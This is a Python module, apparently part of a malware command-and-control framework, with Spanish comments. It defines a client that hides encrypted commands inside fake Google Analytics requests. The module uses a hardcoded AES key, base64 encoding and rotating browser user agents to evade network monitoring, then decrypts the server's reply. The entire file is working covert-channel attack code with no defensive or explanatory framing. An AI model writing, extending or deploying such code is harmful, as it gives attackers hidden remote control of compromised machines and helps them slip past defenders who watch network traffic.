# protocols/http_legit.py
import requests
from crypto.aes_encryptor import AESEncryptor
import base64
import random

# Simula tráfico a Google Analytics
class HTTPLegitClient:
    def __init__(self, c2_url="https://www.google-analytics.com/collect"):
        self.c2_url = c2_url
        self.encryptor = AESEncryptor(key=b"supersecretkey123")
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15..."
        ]

    def _encode_data(self, data: str) -> str:
        encrypted = self.encryptor.encrypt(data)
        return base64.b64encode(encrypted).decode()

    def send_command(self, cmd: str) -> str:
        # Camufla el comando como parámetro de Google Analytics
        params = {
            "v": "1",                              # Versión de GA
            "tid": "UA-123456789",                 # ID de seguimiento
            "cid": self._encode_data(cmd),         # Comando cifrado
            "t": "event",                          # Tipo de evento
            "ec": random.choice(["user", "sys"]),  # Categoría aleatoria
        }
        headers = {"User-Agent": random.choice(self.user_agents)}
        response = requests.get(self.c2_url, params=params, headers=headers)
        return self.encryptor.decrypt(base64.b64decode(response.text))